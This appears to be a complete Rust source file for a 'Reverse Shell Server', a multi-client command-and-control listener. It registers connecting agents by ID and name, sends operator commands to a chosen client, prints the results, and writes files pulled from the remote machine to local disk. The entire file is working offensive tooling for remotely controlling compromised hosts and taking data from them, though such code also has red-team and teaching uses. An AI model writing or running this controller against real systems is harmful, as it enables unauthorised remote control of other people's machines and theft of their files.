use std::net::{Ipv4Addr, TcpListener, TcpStream, SocketAddr, SocketAddrV4};
use std::io::{BufRead, BufReader, Write};
use std::sync::{Arc, Mutex};
use std::thread;
use clap::{Arg, Command};
use std::fs::File;

/* Client info struct. */
struct ClientInfo {
    id: usize,
    agent_name: String,
    address: SocketAddr,
    stream: Arc<Mutex<TcpStream>>,
}

/* Remove the client from the list. */
fn remove_client(clients: &Arc<Mutex<Vec<ClientInfo>>>, client_id: usize) {
    let mut lock = clients.lock().unwrap();
    if let Some(pos) = lock.iter().position(|c| c.id == client_id) {
        lock.remove(pos);
    }
}

fn main() {
    // CLI arguments.
    let matches = Command::new("Reverse Shell Server")
        .version("0.2")
        .author("Duane Dunston <thedunston@gmail.com>")
        .about("Reverse Shell Server")
        .arg(
            Arg::new("IP")
                .short('i')
                .long("address")
                .value_name("ADDRESS")
                .help("IP address to bind to.")
                .required(true),
        )
        .arg(
            Arg::new("port")
                .long("port")
                .value_name("PORT")
                .help("Port to bind to.")
                .required(true),
        )
        .get_matches();

    // Get IP address.
    let ipaddress = matches
        .get_one::<String>("IP")
        .expect("IP address argument is required.");

    // Get port.
    let port: u16 = matches
        .get_one::<String>("port")
        .expect("Port argument is required.")
        .parse()
        .expect("Port must be a valid number between 0 and 65535");

    // Converting IP address to Ipv4Addr.
    let ip = match ipaddress.parse::<Ipv4Addr>() {
        Ok(ip) => ip,
        Err(e) => panic!("{}", e),
    };

    let bindaddress = SocketAddrV4::new(ip, port);
    let tcplistener = TcpListener::bind(bindaddress).expect("Could not bind");

    // List of connected clients.
    let clients = Arc::new(Mutex::new(Vec::<ClientInfo>::new()));

    // Clone Arc for command handling thread
    let clients_for_commands = Arc::clone(&clients);

    // Shared line variable for commands.
    let line = Arc::new(Mutex::new(String::new()));
    let line_for_commands = Arc::clone(&line);

    // Spawn a thread to handle user commands
    thread::spawn(move || {
        let stdin = std::io::stdin();
        loop {
            // Print prompt
            print!("> ");
            std::io::stdout().flush().unwrap();

            let mut input_line = String::new();
            if stdin.read_line(&mut input_line).is_err() {
                eprintln!("Failed to read from stdin.");
                continue;
            }

            let trimmed = input_line.trim().to_string();
            {
                // Lock and update the shared line with the new command.
                let mut l = line_for_commands.lock().unwrap();
                *l = trimmed;
            }

            // Now read the line from the shared variable
            let current_line = {
                let l = line_for_commands.lock().unwrap();
                l.clone()
            };

            if current_line == "clients" {
                // Print the list of connected clients.
                let lock = clients_for_commands.lock().unwrap();
                if lock.is_empty() {
                    println!("No clients connected.");
                } else {
                    println!("ID | Agent Name | Address");
                    println!("-------------------------");
                    for c in lock.iter() {
                        println!("{} | {} | {}", c.id, c.agent_name, c.address);
                    }
                }
            } else {

                // Split the user input into the ID of the client and the command to send.
                let mut parts = current_line.splitn(2, ' ');
                
                // ID of the client.
                let id_str = parts.next().unwrap_or("");

                // Command to send.
                let cmd = parts.next().unwrap_or("");

                // Check if the ID is a valid integer.
                if let Ok(id) = id_str.parse::<usize>() {
                    
                    // Lock the client's mutex.
                    let mut lock = clients_for_commands.lock().unwrap();

                    // Find the client by its ID.
                    if let Some(client) = lock.iter_mut().find(|c| c.id == id) {
                    
                        // Send the command to the client.
                        let mut cmd_to_send = cmd.to_string();
                        cmd_to_send.push('\0');

                        // Lock and write the command to the client's stream.
                        let mut stream = client.stream.lock().unwrap();
                    
                        // Write the command to the client's stream.
                        if let Err(e) = stream.write_all(cmd_to_send.as_bytes()) {
                    
                            eprintln!("Failed to send command to client {}: {}", id, e);
                    
                        } else {
                    
                            println!("Command sent to client {}", id);
                    
                        }
                    
                    } else {
                    
                        println!("No client with ID {} found.", id);
                    
                    }
                
                } else {
                
                    println!("Unknown command. Type 'clients' to list clients.");
                
                }
            
            }
        
        }
    
    });

    // Initialize the first client ID.
    let mut next_id = 0;

    // Loop over incoming connections.
    for stream_result in tcplistener.incoming() {

        // Handle the connection.
        match stream_result {
        
            Ok(client_stream) => {
        
                // Get the client's address.
                let client_address = client_stream.peer_addr().unwrap();

                // Message for the server to see that a client has connected.
                println!("[+] Client connected: {:?}", client_address);

                // Clone the client's stream for reading and writing.
                let write_stream = client_stream.try_clone().expect("Failed to clone stream");

                // NOTE: Arc is a synchronization primitive that allows multiple threads to share ownership of the wrapped value.
                let write_stream_arc = Arc::new(Mutex::new(write_stream));

                // Assign an ID to the client.
                let client_id = next_id;

                // Increment the ID for the next client.
                next_id += 1;

                {

                    // Add the new client to the list.
                    let mut clients_lock = clients.lock().unwrap();
                    clients_lock.push(ClientInfo {
                        id: client_id,
                        agent_name: String::new(),
                        address: client_address,
                        stream: Arc::clone(&write_stream_arc),
                    });

                }

                let clients_for_thread = Arc::clone(&clients);
                let line_for_thread = Arc::clone(&line);

                // Create the thread to handle the client.
                thread::spawn(move || {
                    
                    let mut reader = BufReader::new(&client_stream);
                    let mut agent_buf = Vec::new();

                    // Read the agent name from the client.
                    if let Err(e) = reader.read_until(b'\0', &mut agent_buf) {
                    
                        eprintln!("Error reading agent name: {}", e);
                        remove_client(&clients_for_thread, client_id);
                        return;
                    
                    }

                    // Convert the agent name to a string.
                    let agent_name = String::from_utf8_lossy(&agent_buf).trim_end_matches('\0').trim().to_string();
                         
                   
                    {
                        let mut clients_lock = clients_for_thread.lock().unwrap();

                        // Find the client by its ID and update its agent name.
                        if let Some(c) = clients_lock.iter_mut().find(|c| c.id == client_id) {
 
                            c.agent_name = agent_name.clone();
 
                        }
 
                    }

                    println!("Client {} named: {}", client_id, agent_name);

                    // Now read messages in a loop.
                    loop {
                        
                        // Read the message from the client.
                        let mut buf: Vec<u8> = Vec::new();
                        let bytes_read = match reader.read_until(b'\0', &mut buf) {
                        
                            Ok(b) => b,
                            Err(e) => {
                        
                                eprintln!("Read error from client {}: {}", client_id, e);
                                break;
                        
                            }
                        
                        };

                        // If the client disconnected, break the loop.
                        if bytes_read == 0 {

                            println!("Client {} disconnected", client_id);
                            break;
                        
                        }

                        // Convert the cmd results to a string.
                        let mut message = String::from_utf8_lossy(&buf).trim_end_matches('\0').trim().to_string();
                        message.push('\n');

                        // Lock and read the current line from the shared variable (the input from the user in the loop above.)
                        let current_line = {
                    
                            let l = line_for_thread.lock().unwrap();
                            l.clone()
                    
                        };

                        // Split the current line into tokens.
                        let tokens: Vec<&str> = current_line.split_whitespace().collect();

                        // Check we have at least two tokens: ID and command
                        if tokens.len() < 2 {
                    
                            println!("No valid command provided.");
                            return;
                    
                        }

                        // This checks the "operation" to perform for the client and determins what to do.
                        // If downloading a file, then save the file, else execute a command.
                        
                        // If the user types: 0 download remoteFile localFile, then "download" is the "operation."
                        let todo = tokens[1];

                        // Remote file path.
                        let rfile = if tokens.len() > 2 { tokens[2] } else { "" };
                        
                        // Local file path.
                        let lpath = if tokens.len() > 3 { tokens[3] } else { "" };
                    
                        match todo {

                            "download" => {
                            
                                // Save the message to the file.
                                let mut file = File::create(lpath).unwrap();
                    
                                // Write the message to the local file.
                                file.write_all(message.as_bytes()).unwrap();

                                if let Err(e) = file.flush() {
                            
                                    eprintln!("Failed to create file: {}", e);
                            
                                } else {
                            
                                    println!("File saved to {}", lpath);
                            
                                }
                            
                            }

                            "exec" => {
                            
                                // Print the results returned from the client.
                                println!("Received from client {}: \"{}\"", client_id, message);
                            
                            }

                            _ => {
                            
                                // If the user input doesn't match download or exec, just print unknown command
                                // The client is still connected, we do not remove them
                                println!("Unknown command.");
                            
                            }
                        
                        }

                    }

                    // Only remove the client here after they have disconnected,
                    remove_client(&clients_for_thread, client_id);

                });

            }

            Err(e) => eprintln!("Accept error: {}", e),
        
        }
    
    }

}
